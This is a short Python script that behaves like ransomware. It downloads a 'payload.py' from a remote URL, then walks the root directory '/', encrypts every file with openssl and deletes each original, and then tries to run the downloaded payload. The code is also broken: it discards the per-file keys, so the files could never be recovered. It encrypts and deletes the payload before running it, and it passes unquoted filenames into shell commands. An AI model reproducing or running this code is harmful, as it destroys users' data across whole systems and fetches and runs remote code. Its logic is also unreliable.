import os
import sys
import time
import random
import string
import requests

def generate_random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def download_file(url, local_filename):
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)

def encrypt_file(file_path):
    key = generate_random_string(16)
    os.system(f"openssl enc -aes-256-cbc -salt -in {file_path} -out {file_path}.enc -pass pass:{key}")
    os.remove(file_path)
    return key

def decrypt_file(file_path, key):
    os.system(f"openssl enc -aes-256-cbc -d -in {file_path}.enc -out {file_path} -pass pass:{key}")
    os.remove(f"{file_path}.enc")

def encrypt_files_in_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path)
    return key

def decrypt_files_in_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith('.enc'):
                decrypt_file(file_path, key)

def main():
    # Download and encrypt payload
    payload_url = "https://example.com/payload.py"
    local_payload = "payload.py"
    download_file(payload_url, local_payload)
    payload_key = encrypt_file(local_payload)

    # Encrypt files in the system
    system_directory = "/"
    system_key = encrypt_files_in_directory(system_directory, payload_key)

    # Execute the payload
    os.system(f"python payload.py --key {payload_key} --system-key {system_key}")

if __name__ == "__main__":
    main()
